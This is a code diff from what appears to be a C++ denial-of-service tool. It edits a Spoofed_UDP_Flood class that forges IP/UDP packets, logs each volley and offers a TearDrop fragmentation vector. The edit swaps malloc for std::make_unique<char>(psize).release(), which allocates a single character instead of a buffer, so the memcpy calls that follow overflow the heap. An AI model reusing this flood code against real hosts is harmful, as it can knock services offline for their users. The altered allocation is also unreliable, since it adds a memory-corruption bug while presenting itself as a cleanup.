@@ -4,6 +4,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netdb.h>
+#include <memory>
 
 #include "../Headers/Randomizer.hpp"
 #include "../Headers/Spoofed_UDP_Flood.hpp"
@@ -57,7 +58,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             psh.length = htons(sizeof(struct udphdr) + strlen(buf));
 
             int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(buf);
-            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));
+            pseudogram = std::make_unique<char>(psize).release();
 
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , udp , sizeof(struct udphdr) + strlen(buf));
@@ -75,6 +76,8 @@ void Spoofed_UDP_Flood::attack(const int *id) {
                 message = std::to_string(*id) + ": Voly Sent";
                 logger->Log(&message, Logger::Info);
             }
+
+            delete pseudogram;
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
@@ -82,13 +85,13 @@ void Spoofed_UDP_Flood::attack(const int *id) {
     }
 }
 
-Spoofed_UDP_Flood::Spoofed_UDP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+Spoofed_UDP_Flood::Spoofed_UDP_Flood(const Config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
 
 }
 
 void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
     switch(conf->vector){
-        case config::TearDrop:
+        case Config::TearDrop:
             ip->frag_off |= htons(0x2000);
             break;
         default:break;
